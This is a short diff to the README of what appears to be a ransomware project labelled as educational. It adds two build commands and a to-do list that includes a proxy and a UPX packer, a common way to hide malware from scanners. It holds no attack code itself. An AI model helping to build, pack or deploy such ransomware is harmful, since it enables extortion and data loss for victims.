@@ -4,3 +4,13 @@
 ---
 ### Info
 - Example of an Ransomware for educational purposes
+---
+### How to build
+    chmod +x build.sh
+    bash -c build.sh
+---
+### TO-D0
+- Add Banner
+- Add webserverProxy
+- Add upx packer
+- 
